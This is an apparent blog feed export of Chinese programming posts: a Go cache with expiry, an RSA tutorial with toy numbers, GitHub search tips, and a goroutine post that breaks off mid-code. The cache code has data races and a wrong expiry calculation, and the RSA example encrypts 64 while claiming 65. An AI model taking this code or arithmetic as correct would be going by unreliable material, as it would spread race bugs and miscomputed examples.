<h2 id="缓存系统的设计"><a href="#缓存系统的设计" class="headerlink" title="缓存系统的设计"></a>缓存系统的设计</h2><p>缓存系统中，缓存的数据一般都存储在内存中，所以我们设计的缓存系统要以某一种方式管理内存中的数据。既然缓存数据是存储在内存中的，那如果系统停机，那数据岂不就丢失了吗？其实一般情况下，缓存系统还支持将内存中的数据写入到文件中，在系统再次启动时，再将文件中的数据加载到内存中，这样一来就算系统停机，缓存数据也不会丢失。</p>
<p>同时缓存系统还提供过期数据清理机制，也就是说缓存的数据项是有生存时间的，如果数据项过期，则数据项会从内存中被删除，这样一来热数据会一直存在，而冷数据则会被删除，也没有必要进行缓存。</p>
<p>缓存系统还需要对外提供操作的接口，这样系统的其他组件才能使用缓存。一般情况下，缓存系统需要支持 CRUD 操作，也就算创建（添加），读取，更新和删除操作。</p>
<p>通过以上分析，可以总结出缓存系统需要有以下功能：</p>
<ol>
<li>缓存数据的存储</li>
<li>过期数据项管理</li>
<li>内存数据导出，导入</li>
<li>提供 CRUD 接口</li>
</ol>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> examples</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;testing&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ICache <span class="keyword">interface</span> &#123;</span><br><span class="line">	<span class="comment">//size support: 1KB,100KB,1MB,2MB,1GB</span></span><br><span class="line">	SetMaxMemory(size <span class="type">string</span>) <span class="type">bool</span></span><br><span class="line">	<span class="comment">//key expire after expire time</span></span><br><span class="line">	Set(key <span class="type">string</span>, val <span class="keyword">interface</span>&#123;&#125;, expire time.Duration)</span><br><span class="line">	<span class="comment">//get one key</span></span><br><span class="line">	Get(key <span class="type">string</span>) (<span class="keyword">interface</span>&#123;&#125;, <span class="type">bool</span>)</span><br><span class="line">	<span class="comment">//delete one key</span></span><br><span class="line">	Del(key <span class="type">string</span>) <span class="type">bool</span></span><br><span class="line">	<span class="comment">//exists one key</span></span><br><span class="line">	Exists(key <span class="type">string</span>) <span class="type">bool</span></span><br><span class="line">	<span class="comment">//delete all key</span></span><br><span class="line">	Flush() <span class="type">bool</span></span><br><span class="line">	<span class="comment">//get all key</span></span><br><span class="line">	Keys() []<span class="type">string</span></span><br><span class="line">	<span class="comment">//garbage collection every second</span></span><br><span class="line">	GcLoop()</span><br><span class="line">	<span class="comment">//delete expired key</span></span><br><span class="line">	DeleteExpired()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Item <span class="keyword">struct</span> &#123;</span><br><span class="line">	Object     <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">	Expiration <span class="type">int64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> cache <span class="keyword">struct</span> &#123;</span><br><span class="line">	size     <span class="type">string</span></span><br><span class="line">	items    <span class="keyword">map</span>[<span class="type">string</span>]Item</span><br><span class="line">	mu       sync.RWMutex</span><br><span class="line">	interval time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> SetMaxMemory(size <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	c.mu.RLock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.RUnlock()</span><br><span class="line"></span><br><span class="line">	c.size = size</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> Set(k <span class="type">string</span>, x <span class="keyword">interface</span>&#123;&#125;, d time.Duration) &#123;</span><br><span class="line">	c.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.Unlock()</span><br><span class="line"></span><br><span class="line">	e := time.Now().Add(d * time.Second).Unix()</span><br><span class="line"></span><br><span class="line">	c.items[k] = Item&#123;</span><br><span class="line">		Object:     x,</span><br><span class="line">		Expiration: e,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> Get(k <span class="type">string</span>) (<span class="keyword">interface</span>&#123;&#125;, <span class="type">bool</span>) &#123;</span><br><span class="line">	c.mu.RLock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.RUnlock()</span><br><span class="line"></span><br><span class="line">	item, found := c.items[k]</span><br><span class="line">	<span class="keyword">if</span> !found &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> time.Now().Unix() &gt; item.Expiration &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> item.Object, <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> Del(k <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	c.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.Unlock()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> _, found := c.items[k]; found &#123;</span><br><span class="line">		<span class="built_in">delete</span>(c.items, k)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> Exists(k <span class="type">string</span>) <span class="type">bool</span> &#123;</span><br><span class="line">	c.mu.RLock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.RUnlock()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> _, found := c.items[k]; found &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> Flush() <span class="type">bool</span> &#123;</span><br><span class="line">	c.mu.Lock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.Unlock()</span><br><span class="line"></span><br><span class="line">	c.items = <span class="keyword">map</span>[<span class="type">string</span>]Item&#123;&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> Keys() []<span class="type">string</span> &#123;</span><br><span class="line">	c.mu.RLock()</span><br><span class="line">	<span class="keyword">defer</span> c.mu.RUnlock()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> keys []<span class="type">string</span></span><br><span class="line">	<span class="keyword">for</span> k := <span class="keyword">range</span> c.items &#123;</span><br><span class="line">		keys = <span class="built_in">append</span>(keys, k)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> keys</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> GcLoop() &#123;</span><br><span class="line">	ticker := time.NewTicker(c.interval)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="keyword">select</span> &#123;</span><br><span class="line">		<span class="keyword">case</span> &lt;-ticker.C:</span><br><span class="line">			c.DeleteExpired()</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *cache)</span></span> DeleteExpired() &#123;</span><br><span class="line">	now := time.Now().Unix()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> c.items &#123;</span><br><span class="line">		<span class="keyword">if</span> now &gt; v.Expiration &#123;</span><br><span class="line">			c.Del(k)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewCache</span><span class="params">()</span></span> ICache &#123;</span><br><span class="line">	c := &amp;cache&#123;</span><br><span class="line">		size:     <span class="string">&quot;1024&quot;</span>,</span><br><span class="line">		items:    <span class="keyword">map</span>[<span class="type">string</span>]Item&#123;&#125;,</span><br><span class="line">		interval: time.Second,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">go</span> c.GcLoop()</span><br><span class="line">	<span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TestCacheExample</span><span class="params">(t *testing.T)</span></span> &#123;</span><br><span class="line">	c := NewCache()</span><br><span class="line"></span><br><span class="line">	c.Set(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">	time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">	r, b := c.Get(<span class="string">&quot;foo&quot;</span>)</span><br><span class="line"></span><br><span class="line">	t.Log(r, b)</span><br><span class="line">	t.Log(<span class="string">&quot;test cache finished.&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Golang</category>
      </categories>
  </entry>
  <entry>
    <title>RSA 算法原理</title>
    <url>/2020/10/algorithm-rsa/</url>
    <content><![CDATA[<h2 id="一、什么是-RSA-算法"><a href="#一、什么是-RSA-算法" class="headerlink" title="一、什么是 RSA 算法"></a>一、什么是 RSA 算法</h2><p>1977 年，三位数学家 Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">（1）甲方选择某一种加密规则，对信息进行加密；</span><br><span class="line">（2）乙方使用同一种规则，对信息进行解密。</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h2 id="二、互质关系"><a href="#二、互质关系" class="headerlink" title="二、互质关系"></a>二、互质关系</h2><p>如果两个正整数，除了 1 以外，没有其他公因子，我们就称这两个数是互质关系（coprime）。</p>
<p>比如，15 和 32 没有公因子，所以它们是互质关系。这说明，不是质数也可以构成互质关系。</p>
<h2 id="三、欧拉函数"><a href="#三、欧拉函数" class="headerlink" title="三、欧拉函数"></a>三、欧拉函数</h2><p>任意给定正整数 n，请问在小于等于 n 的正整数之中，有多少个与 n 构成互质关系？（比如，在 1 到 8 之中，有多少个数与 8 构成互质关系？）</p>
<p>计算这个值的方法就叫做欧拉函数，以 φ(n) 表示。在 1 到 8 之中，与 8 形成互质关系的是 1、3、5、7，所以 φ(n) &#x3D; 4。</p>
<h2 id="四、欧拉定理"><a href="#四、欧拉定理" class="headerlink" title="四、欧拉定理"></a>四、欧拉定理</h2><p>欧拉函数的用处，在于欧拉定理。”欧拉定理” 指的是：</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">如果两个正整数a和<span class="built_in">n</span>互质，则<span class="built_in">n</span>的欧拉函数 φ(<span class="built_in">n</span>) 可以让下面的等式成立：</span><br><span class="line">a^φ(<span class="built_in">n</span>) ≡ <span class="number">1</span> (<span class="built_in">mod</span> <span class="built_in">n</span>)</span><br></pre></td></tr></table></figure>

<p>也就是说，a 的 φ(n) 次方被 n 除的余数为 1。或者说，a 的 φ(n) 次方减去 1，可以被 n 整除。</p>
<p>比如，3 和 7 互质，而 7 的欧拉函数 φ(7) 等于 6，所以 3 的 6 次方（729）减去 1，可以被 7 整除（728&#x2F;7&#x3D;104）。</p>
<h2 id="五、最大公约数"><a href="#五、最大公约数" class="headerlink" title="五、最大公约数"></a>五、最大公约数</h2><p>最大公因数，也称最大公约数、最大公因子，指两个或多个整数共有约数中最大的一个。</p>
<p>a，b 的最大公约数记为（a，b），同样的，a，b，c 的最大公约数记为（a，b，c），多个整数的最大公约数也有同样的记号。</p>
<p>与最大公约数相对应的概念是最小公倍数，a，b 的最小公倍数记为 [a，b]。</p>
<p>由于两个数的乘积等于这两个数的最大公约数与最小公倍数的积。即（a，b）×[a，b]&#x3D;a×b。</p>
<p>所以，求两个数的最小公倍数，就可以先求出它们的最大公约数，然后用上述公式求出它们的最小公倍数。</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">4   |108    96</span><br><span class="line">3   |27     24</span><br><span class="line">     9      8</span><br><span class="line">最大公约数是4<span class="number">*3</span> = 12</span><br><span class="line">最小公倍数是4<span class="number">*3</span><span class="number">*9</span><span class="number">*8</span> = 864 或 108<span class="number">*96</span>/12 = 864</span><br></pre></td></tr></table></figure>

<h2 id="六、模反元素"><a href="#六、模反元素" class="headerlink" title="六、模反元素"></a>六、模反元素</h2><p>如果两个正整数 a 和 n 互质，那么一定可以找到整数 b，使得 ab-1 被 n 整除，或者说 ab 被 n 除的余数是 1。</p>
<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">ab ≡ <span class="number">1</span> (<span class="built_in">mod</span> <span class="built_in">n</span>)</span><br><span class="line">这时，b就叫做a的<span class="string">&quot;模反元素&quot;</span>。</span><br></pre></td></tr></table></figure>

<p>比如，3 和 11 互质，那么 3 的模反元素就是 4，因为 (3 × 4)-1 可以被 11 整除。</p>
<p>显然，模反元素不止一个， 4 加减 11 的整数倍都是 3 的模反元素 {…,-18,-7,4,15,26,…}，即如果 b 是 a 的模反元素，则 b+kn 都是 a 的模反元素。</p>
<h2 id="七、密钥生成的步骤"><a href="#七、密钥生成的步骤" class="headerlink" title="七、密钥生成的步骤"></a>七、密钥生成的步骤</h2><ol>
<li>随机选择两个不相等的质数。p&#x3D;61，q&#x3D;53。（实际应用中，这两个质数越大，就越难破解。）</li>
<li>计算 p 和 q 的乘积 n。<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">n</span> <span class="operator">=</span> <span class="number">61</span>×<span class="number">53</span> <span class="operator">=</span> <span class="number">3233</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>n 的长度就是密钥长度。3233 写成二进制是 110010100001，一共有 12 位，所以这个密钥就是 12 位。</p>
<p>实际应用中，RSA 密钥一般是 1024 位，重要场合则为 2048 位。 </p>
<ol start="3">
<li><p>计算 n 的欧拉函数 φ(n)，并求出最小公倍数。</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">λ<span class="comment">(n)</span> = lcm<span class="comment">((p-1)</span>,<span class="comment">(q-1)</span>) = <span class="number">780</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>随机选择一个整数 e，条件是 1 &lt;e &lt; λ(n)，且 e 与 λ(n) 互质。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">随机选择17。（实际应用中，常常选择65537。）</span><br></pre></td></tr></table></figure>
</li>
<li><p>计算 e 对于 λ(n) 的模反元素 d。所谓 “模反元素” 就是指有一个整数 d，可以使得 ed 被 λ(n) 除的余数为 1。</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">ed ≡ <span class="number">1</span> (mod λ(n)) <span class="operator">=</span> <span class="number">17</span> * d % λ(n) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="attribute">d</span> <span class="operator">=</span> <span class="number">413</span> 或者更大倍数的数值</span><br></pre></td></tr></table></figure>
</li>
<li><p>公钥为为 (n &#x3D; 3233, e &#x3D; 17)。明文消息为 m，密文信息为 c，加密公式为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">c</span> = m^<span class="number">17</span> mod <span class="number">3233</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>私钥为 (n &#x3D; 3233, d &#x3D; 413)。明文消息为 m，密文信息为 c，解密公式为</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">m</span> = c^<span class="number">413</span> mod <span class="number">3233</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="八、使用密钥进行加密解密"><a href="#八、使用密钥进行加密解密" class="headerlink" title="八、使用密钥进行加密解密"></a>八、使用密钥进行加密解密</h2><p>例如，为了加密 m &#x3D; 65，我们计算</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">c</span> = <span class="number">64</span>^<span class="number">17</span> mod <span class="number">3233</span> = <span class="number">2790</span></span><br></pre></td></tr></table></figure>

<p>为了解密 c &#x3D; 2790，我们计算</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">m</span> = <span class="number">2790</span>^<span class="number">413</span> mod <span class="number">3233</span> = <span class="number">65</span></span><br></pre></td></tr></table></figure>

<h2 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h2><p><span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTMvMDYvcnNhX2FsZ29yaXRobV9wYXJ0X29uZS5odG1s">RSA 算法原理（一）（阮一峰）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cDovL3d3dy5ydWFueWlmZW5nLmNvbS9ibG9nLzIwMTMvMDcvcnNhX2FsZ29yaXRobV9wYXJ0X3R3by5odG1s">RSA 算法原理（二）（阮一峰）<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dzX2tmeGQvYXJ0aWNsZS9kZXRhaWxzLzg2NDI2MzA2">RSA 算法简易解析<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JUFDJUE3JUU2JThCJTg5JUU1JTg3JUJEJUU2JTk1JUIw">Wiki 欧拉函数<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JUFDJUE3JUU2JThCJTg5JUU1JUFFJTlBJUU3JTkwJTg2XyglRTYlOTUlQjAlRTglQUUlQkEp">Wiki 欧拉定理<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvUlNBXyhjcnlwdG9zeXN0ZW0p">Wiki RSA 算法<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9MQ00lRTUlODclQkQlRTYlOTUlQjAvNzc4NTQyNQ==">Baike LCM 函数<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOUMlODAlRTUlQjAlOEYlRTUlODUlQUMlRTUlODAlOEQlRTYlOTUlQjAvNjE5MjM3NQ==">Baike 最小公倍数<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTYlOUMlODAlRTUlQTQlQTclRTUlODUlQUMlRTclQkElQTYlRTYlOTUlQjAvODY5MzA4">Baike 最大公约数<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>原来 GitHub 还有这种骚操作？</title>
    <url>/2020/03/github-operate/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>相信大家进入 GitHub 搜索一些资料时，都是下面的步骤</p>
<ol>
<li>进入网页</li>
<li>搜索栏输入关键字</li>
<li>搜索得到结果</li>
</ol>
<span id="more"></span>

<p>看似没毛病，确实没毛病。但是我想说的是这样的搜索真的能够搜到你想要的吗？</p>
<p>也许是可以，但是例如上面我搜的 Django 关键词，显示出来的结果有26万条，你能找到想要的吗？即使找到了，得浪费多少时间呢？</p>
<p>今天来普及一下，GitHub 里的一些高级搜索方法。</p>
<h3 id="in-name-Django"><a href="#in-name-Django" class="headerlink" title="in:name Django"></a>in:name Django</h3><p>名字中有 “Django”</p>
<h3 id="in-readme-Django"><a href="#in-readme-Django" class="headerlink" title="in:readme Django"></a>in:readme Django</h3><p>readme中有“Django”</p>
<h3 id="in-description-Django"><a href="#in-description-Django" class="headerlink" title="in:description Django"></a>in:description Django</h3><p>描述中有 “Django”</p>
<h3 id="stars-1000"><a href="#stars-1000" class="headerlink" title="stars:&gt;1000"></a>stars:&gt;1000</h3><p>star 超过 1000 的有关 Django 的项目</p>
<p>上面具体给出了一些高级搜索语法使用方法，下面总结日常工作我们会使用的一些语法：</p>
<h4 id="项目名字中有-“example”："><a href="#项目名字中有-“example”：" class="headerlink" title="项目名字中有 “example”："></a>项目名字中有 “example”：</h4><p>in:name example</p>
<h4 id="项目-readme-中有-“example”："><a href="#项目-readme-中有-“example”：" class="headerlink" title="项目 readme 中有 “example”："></a>项目 readme 中有 “example”：</h4><p>in:readme example</p>
<h4 id="项目描述中有-“example”："><a href="#项目描述中有-“example”：" class="headerlink" title="项目描述中有 “example”："></a>项目描述中有 “example”：</h4><p>in:description example</p>
<h4 id="项目-star-1000："><a href="#项目-star-1000：" class="headerlink" title="项目 star&gt;1000："></a>项目 star&gt;1000：</h4><p>stars:&gt;1000 关键词</p>
<h4 id="项目-fork-1000："><a href="#项目-fork-1000：" class="headerlink" title="项目 fork&gt;1000："></a>项目 fork&gt;1000：</h4><p>forks:&gt;1000 关键词</p>
<h4 id="项目在-2019-年-9-月-1-日后有更新的："><a href="#项目在-2019-年-9-月-1-日后有更新的：" class="headerlink" title="项目在 2019 年 9 月 1 日后有更新的："></a>项目在 2019 年 9 月 1 日后有更新的：</h4><p>pushed:&gt;2019-09-01 关键词</p>
<h4 id="项目在-2019-年-1-月-3-日后创建的："><a href="#项目在-2019-年-1-月-3-日后创建的：" class="headerlink" title="项目在 2019 年 1 月 3 日后创建的："></a>项目在 2019 年 1 月 3 日后创建的：</h4><p>created:&gt;2019-01-03 关键字</p>
<h4 id="用Java编写的项目："><a href="#用Java编写的项目：" class="headerlink" title="用Java编写的项目："></a>用Java编写的项目：</h4><p>language:java 关键词</p>
<h4 id="明确搜索某个人或组织的仓库-："><a href="#明确搜索某个人或组织的仓库-：" class="headerlink" title="明确搜索某个人或组织的仓库 ："></a>明确搜索某个人或组织的仓库 ：</h4><p>user:userName</p>
<p>user:userName language:java</p>
<p>org:spring-cloud</p>
<p>除了上面给大家总结的常用语法，GitHub 官方提供了官方文档：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9oZWxwLmdpdGh1Yi5jb20vZW4vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1mb3ItcmVwb3NpdG9yaWVz">https://help.github.com/en/github/searching-for-information-on-github/searching-for-repositories<i class="fa fa-external-link-alt"></i></span></p>
<p>除了通过语法来进行高级搜索，GitHub 也提供了图形界面的高级搜索：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYXJjaC9hZHZhbmNlZA==">https://github.com/search/advanced<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>DevTools</category>
      </categories>
      <tags>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>深入研究 goroutine 并发控制与通信</title>
    <url>/2020/03/go-goroutines/</url>
    <content><![CDATA[<h2 id="深入研究-goroutine-并发控制与通信"><a href="#深入研究-goroutine-并发控制与通信" class="headerlink" title="深入研究 goroutine 并发控制与通信"></a>深入研究 goroutine 并发控制与通信</h2><p>开发go程序的时候，时常需要使用goroutine并发处理任务，有时候这些goroutine是相互独立的，而有的时候，多个goroutine之间常常是需要同步与通信的。</p>
<p>另一种情况，主goroutine需要控制它所属的子goroutine，总结起来，实现多个goroutine间的同步与通信大致有</p>
<span id="more"></span>

<p>- 全局共享变量<br>- channel通信（CSP模型）<br>- Context包</p>
<p>本文章通过goroutine同步与通信的一个典型场景-通知子goroutine退出运行，来深入讲解下golang的控制并发。</p>
<h2 id="通知多个子goroutine退出运行"><a href="#通知多个子goroutine退出运行" class="headerlink" title="通知多个子goroutine退出运行"></a>通知多个子goroutine退出运行</h2><p>goroutine作为go语言的并发利器，不仅性能强劲而且使用方便：只需要一个关键字go即可将普通函数并发执行，且goroutine占用内存极小（一个goroutine只占2KB的内存），所以开发go程序的时候很多开发者常常会使用这个并发工具，独立的并发任务比较简单，只需要用go关键字修饰函数就可以启用一个goroutine直接运行；但是，实际的并发场景常常是需要进行协程间的同步与通信，以及精确控制子goroutine开始和结束，其中一个典型场景就是主进程通知名下所有子goroutine优雅退出运行。</p>
<p>由于goroutine的退出机制设计是，goroutine退出只能由本身控制，不允许从外部强制结束该goroutine。只有两种情况例外，那就是main函数结束或者程序崩溃结束运行；所以，要实现主进程控制子goroutine的开始和结束，必须借助其它工具来实现。</p>
<h2 id="控制并发的方法"><a href="#控制并发的方法" class="headerlink" title="控制并发的方法"></a>控制并发的方法</h2><p>实现控制并发的方式，大致可分成以下三类：<br>- 全局共享变量<br>- channel通信<br>- Context包</p>
<h2 id="全局共享变量"><a href="#全局共享变量" class="headerlink" title="全局共享变量"></a>全局共享变量</h2><p>这是最简单的实现控制并发的方式，实现步骤是：<br>1. 声明一个全局变量；<br>2. 所有子goroutine共享这个变量，并不断轮询这个变量检查是否有更新；<br>3. 在主进程中变更该全局变量；<br>4. 子goroutine检测到全局变量更新，执行相应的逻辑。</p>
<p>示例如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    running := <span class="literal">true</span></span><br><span class="line">    f := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> running &#123;</span><br><span class="line">            fmt.Println(<span class="string">&quot;sub proc running...&quot;</span>)</span><br><span class="line">            time.Sleep(<span class="number">1</span> * time.Second)</span><br><span class="line">        &#125;</span><br><span class="line">        fmt.Println(<span class="string">&quot;sub proc exit&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">go</span> f()</span><br><span class="line">    <span class="keyword">go</span> f()</span><br><span class="line">    <span class="keyword">go</span> f()</span><br><span class="line">    time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">    running = <span class="literal">false</span></span><br><span class="line">    time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;main proc exit&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>全局变量的优势是简单方便，不需要过多繁杂的操作，通过一个变量就可以控制所有子goroutine的开始和结束；缺点是功能有限，由于架构所致，该全局变量只能是多读一写，否则会出现数据同步问题，当然也可以通过给全局变量加锁来解决这个问题，但那就增加了复杂度，另外这种方式不适合用于子goroutine间的通信，因为全局变量可以传递的信息很小；还有就是主进程无法等待所有子goroutine退出，因为这种方式只能是单向通知，所以这种方法只适用于非常简单的逻辑且并发量不太大的场景，一旦逻辑稍微复杂一点，这种方法就有点捉襟见肘。</p>
<h2 id="channel通信"><a href="#channel通信" class="headerlink" title="channel通信"></a>channel通信</h2><p>另一种更为通用且灵活的实现控制并发的方式是使用channel进行通信。</p>
<p>首先，我们先来了解下什么是golang中的channel：Channel是Go中的一个核心类型，你可以把它看成一个管道，通过它并发核心单元就可以发送或者接收数据进行通讯(communication)。<br>要想理解 channel 要先知道 CSP 模型：</p>
<p>CSP 是 Communicating Sequential Process 的简称，中文可以叫做通信顺序进程，是一种并发编程模型，由 Tony Hoare 于 1977 年提出。简单来说，CSP 模型由并发执行的实体（线程或者进程）所组成，实体之间通过发送消息进行通信，这里发送消息时使用的就是通道，或者叫 channel。CSP 模型的关键是关注 channel，而不关注发送消息的实体。Go 语言实现了 CSP 部分理论，goroutine 对应 CSP 中并发执行的实体，channel 也就对应着 CSP 中的 channel。</p>
<p>也就是说，CSP 描述这样一种并发模型：多个Process 使用一个 Channel 进行通信, 这个 Channel 连结的 Process 通常是匿名的，消息传递通常是同步的（有别于 Actor Model）。</p>
<h2 id="先来看示例代码"><a href="#先来看示例代码" class="headerlink" title="先来看示例代码"></a>先来看示例代码</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;os/signal&quot;</span></span><br><span class="line">    <span class="string">&quot;sync&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">consumer</span><span class="params">(stop &lt;-<span 